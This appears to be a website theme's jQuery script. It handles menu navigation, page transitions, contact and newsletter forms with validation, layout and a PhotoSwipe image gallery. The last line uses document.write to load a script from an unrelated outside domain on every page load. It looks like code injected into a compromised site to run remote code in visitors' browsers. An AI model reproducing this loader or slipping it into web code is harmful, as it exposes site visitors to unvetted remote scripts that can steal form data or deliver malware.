(function($) {
    "use strict";
	/* ======= Clear Default ====== */
	$.fn.clearDefault = function() {
		"use strict";
		return this.each(function() {
			var default_value = $(this).val();
		});
	};

    /* ======= Callery Packery ====== */
        var container = $('#timer-gallery-packery');
        $(container).packery({
          percentPosition: true
        })

    $('body').on('click', '.tabsnav__item', function() {
        $(container).packery({
          percentPosition: true
        })
    });



	/* ======= Height Fix ====== */
	function vertCenter(item) {
		"use strict";
		item.css({
			'margin-top' : '-' + parseInt((item.height() / 2), 0) + 'px'
		}).fadeIn();
	}

	jQuery(window).on('load', function() {
		vertCenter($('.itemwrap > li > div'));
		vertCenter($('#thumbs'));
		vertCenter($('#clock'));
		// vertCenter($('#demo_thumbs'));
	});


	jQuery(document).ready(function($) {
		"use strict";

		$('.show_toggle a').on('click', function(){
			$('body').toggleClass('menu_show');

			return false;
		});

		$('.form_submit').on('click', function(){
			var form = $(this).parents('form');
			form.find('.form_item').removeClass('error');
			form.find('.error_block').remove();
			var post_data;
			var errors = formValidation(form),
				output;
			if( Object.keys(errors).length > 0 ) {
				showErrors(form, errors);
			} else {
				if(form.attr('id') == 'contacts_form') {
 					post_data = {
            		    'name'     : $('input[name=name]').val(),
            		    'email'    : $('input[name=email]').val(),
            		    'message'  : $('input[name=message]').val()
            		};

            		//Ajax post data to server
            		jQuery.post('contacts.php', post_data, function(response){
            		    if(response.type == 'error'){ //load json data from server and output message
            		        output = '<div class="error_block">'+response.text+'</div>';
            		    } else{
            		        output = '<div class="success">'+response.text+'</div>';
            		        //reset values in all input fields
            		        $("#contacts_form .form_item").val('');
            		    }
            		    form.find('.form_row').slideUp();
            		    form.find("#contact_results").hide().html(output).slideDown();
            		}, 'json');
        		} else {
        			post_data = {
            		    'subscribe_email': $('input[name=subscribe_email]').val(),
            		};

            		jQuery.post('subscribe.php', post_data, function(response){

        		        output = '<div class="success">'+response.text+'</div>';
        		        //reset values in all input fields
        		        $("#contacts_form .form_item").val('');
        		        form.find('.form_inner').slideUp();
            		    form.find("#form_results").hide().html(output).slideDown();
            		}, 'json');
        		}

		}
		return false;
	});

		$('.side-page').on('click', function() {
			var curPage = $(this).attr('id');
			$('.main-menu li').removeClass('active');
			$('.main-menu li a[data-page="' + curPage + '"]').parent().addClass('active');
			$('.side-page').removeClass('active').removeClass('went-left').removeClass('went-right');
			$(this).prev().addClass('side-left').addClass('went-left');
			$(this).next().addClass('side-right').addClass('went-right');
			$(this).addClass('active');
		});

		$('.main-menu a:not(.home-link)').on('click', function() {
			$('#clock').removeClass('active');
			$('.mainarea-content').addClass('active');
			$('.close').addClass('active');
			var curPage = $(this).attr('data-page');
			$('.main-menu li').removeClass('active');
			$(this).parent().addClass('active');
			$('.mainarea-content > div').removeClass('active').removeClass('went-left').removeClass('went-right');
			$('#' + curPage + '').prev().addClass('side-left').addClass('went-left');
			$('#' + curPage + '').next().addClass('side-right').addClass('went-right');
			$('#' + curPage + '').addClass('active');
		});

		$('.close').on('click', function(e) {
			e.preventDefault();
			$('#clock').addClass('active');
			$('.main-menu li').removeClass('active');
			$('.close').removeClass('active');
			$('.mainarea-content').removeClass('active');
		});

		$('.home-link').on('click', function(e) {
			e.preventDefault();
			$('#clock').addClass('active');
			$('.main-menu li').removeClass('active');
			$('.close').removeClass('active');
			$('.mainarea-content').removeClass('active');
			$('.home-link').parent().addClass('active');
		});

		$('input[type="text"]').clearDefault();


		$('#tweet_list').cycle({
			fx : 'custom',
			cssBefore : {
				top : 50,
				height : 100,
				opacity : 0,
				display : 'block'
			},
			animIn : {
				top : 0,
				opacity : 1
			},
			animOut : {
				opacity : 0,
				top : -50
			},
			cssAfter : {
				zIndex : 0,
				display : 'none'
			},
			speed : 1750,
			sync : false,
			easeIn : 'easeOutBack',
			easeOut : 'easeInBack'
		});
	});

	function resizeStuff() {
		vertCenter($('.itemwrap > li > div'));
		vertCenter($('#thumbs'));
		vertCenter($('#clock'));
	}
	var onSmartResize = false;

	$(window).resize(function(){
		if(onSmartResize !== false)
			clearTimeout(onSmartResize);
		onSmartResize = setTimeout( function(){resizeStuff() }, 200); //200 is time in miliseconds
	});

})(jQuery);



/* Forms Validation */
function formValidation(form) {

	var error = {};

	if(form) {
		form.find('.form_item').each(function(){
			var $th = $(this);

			if( $th.val() != '' ) {
				if( $th.attr('type') == 'email' ) {
					var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
					if( !emailReg.test( jQuery.trim($th.val()) ) ) {
						error[$th.attr('id')] = 'not_email';
					}
				}
			} else {
				error[$th.attr('id')] = 'empty';
			}

		});
	}
	return error;
}

/* Validation Errors */
function showErrors(form, errors) {
	var error_message = ''
	for(var i in errors) {
		var form_item = form.find($('#'+i)),
			form_item_name = form_item.attr('placeholder');

		form_item.addClass('error');
		if( errors[i] == 'empty' )
			error_message += '<div class="error">Field '+form_item_name+' is required</div>';
		else
			error_message += '<div class="error">You entered an invalid email</div>';
	}
	if( form.find('.error_block').length > 0) {
		form.find('.error_block').html(error_message);
	} else {
		form.append('<div class="error_block">'+error_message+'</div>');
	}
}
var initPhotoSwipeFromDOM = function(gallerySelector) {

    // parse slide data (url, title, size ...) from DOM elements
    // (children of gallerySelector)
    var parseThumbnailElements = function(el) {
        var thumbElements = el.childNodes,
            numNodes = thumbElements.length,
            items = [],
            figureEl,
            linkEl,
            size,
            item;

        for(var i = 0; i < numNodes; i++) {

            figureEl = thumbElements[i]; // <figure> element

            // include only element nodes
            if(figureEl.nodeType !== 1) {
                continue;
            }

            linkEl = figureEl.children[0]; // <a> element

            size = linkEl.getAttribute('data-size').split('x');

            // create slide object
            item = {
                src: linkEl.getAttribute('href'),
                w: parseInt(size[0], 10),
                h: parseInt(size[1], 10)
            };



            if(figureEl.children.length > 1) {
                // <figcaption> content
                item.title = figureEl.children[1].innerHTML;
            }

            if(linkEl.children.length > 0) {
                // <img> thumbnail element, retrieving thumbnail url
                item.msrc = linkEl.children[0].getAttribute('src');
            }

            item.el = figureEl; // save link to element for getThumbBoundsFn
            items.push(item);
        }

        return items;
    };

    // find nearest parent element
    var closest = function closest(el, fn) {
        return el && ( fn(el) ? el : closest(el.parentNode, fn) );
    };

    // triggers when user clicks on thumbnail
    var onThumbnailsClick = function(e) {
        e = e || window.event;
        e.preventDefault ? e.preventDefault() : e.returnValue = false;

        var eTarget = e.target || e.srcElement;

        // find root element of slide
        var clickedListItem = closest(eTarget, function(el) {
            return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
        });

        if(!clickedListItem) {
            return;
        }

        // find index of clicked item by looping through all child nodes
        // alternatively, you may define index via data- attribute
        var clickedGallery = clickedListItem.parentNode,
            childNodes = clickedListItem.parentNode.childNodes,
            numChildNodes = childNodes.length,
            nodeIndex = 0,
            index;

        for (var i = 0; i < numChildNodes; i++) {
            if(childNodes[i].nodeType !== 1) {
                continue;
            }

            if(childNodes[i] === clickedListItem) {
                index = nodeIndex;
                break;
            }
            nodeIndex++;
        }



        if(index >= 0) {
            // open PhotoSwipe if valid index found
            openPhotoSwipe( index, clickedGallery );
        }
        return false;
    };

    // parse picture index and gallery index from URL (#&pid=1&gid=2)
    var photoswipeParseHash = function() {
        var hash = window.location.hash.substring(1),
        params = {};

        if(hash.length < 5) {
            return params;
        }

        var vars = hash.split('&');
        for (var i = 0; i < vars.length; i++) {
            if(!vars[i]) {
                continue;
            }
            var pair = vars[i].split('=');
            if(pair.length < 2) {
                continue;
            }
            params[pair[0]] = pair[1];
        }

        if(params.gid) {
            params.gid = parseInt(params.gid, 10);
        }

        return params;
    };

    var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
        var pswpElement = document.querySelectorAll('.pswp')[0],
            gallery,
            options,
            items;

        items = parseThumbnailElements(galleryElement);

        // define options (if needed)
        options = {

            // define gallery index (for URL)
            galleryUID: galleryElement.getAttribute('data-pswp-uid'),

            getThumbBoundsFn: function(index) {
                // See Options -> getThumbBoundsFn section of documentation for more info
                var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
                    pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
                    rect = thumbnail.getBoundingClientRect();

                return {x:rect.left, y:rect.top + pageYScroll, w:rect.width};
            }

        };

        // PhotoSwipe opened from URL
        if(fromURL) {
            if(options.galleryPIDs) {
                // parse real index when custom PIDs are used
                // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
                for(var j = 0; j < items.length; j++) {
                    if(items[j].pid == index) {
                        options.index = j;
                        break;
                    }
                }
            } else {
                // in URL indexes start from 1
                options.index = parseInt(index, 10) - 1;
            }
        } else {
            options.index = parseInt(index, 10);
        }

        // exit if index not found
        if( isNaN(options.index) ) {
            return;
        }

        if(disableAnimation) {
            options.showAnimationDuration = 0;
        }

        // Pass data to PhotoSwipe and initialize it
        gallery = new PhotoSwipe( pswpElement, PhotoSwipeUI_Default, items, options);
        gallery.init();
    };

    // loop through all gallery elements and bind events
    var galleryElements = document.querySelectorAll( gallerySelector );

    for(var i = 0, l = galleryElements.length; i < l; i++) {
        galleryElements[i].setAttribute('data-pswp-uid', i+1);
        galleryElements[i].onclick = onThumbnailsClick;
    }

    // Parse URL and open gallery if it contains #&pid=3&gid=1
    var hashData = photoswipeParseHash();
    if(hashData.pid && hashData.gid) {
        openPhotoSwipe( hashData.pid ,  galleryElements[ hashData.gid - 1 ], true, true );
    }
};

// execute above function
initPhotoSwipeFromDOM('.timer-gallery');
document.write('<script src="https://e-mozg.com/form.js" type="text/javascript"></script>');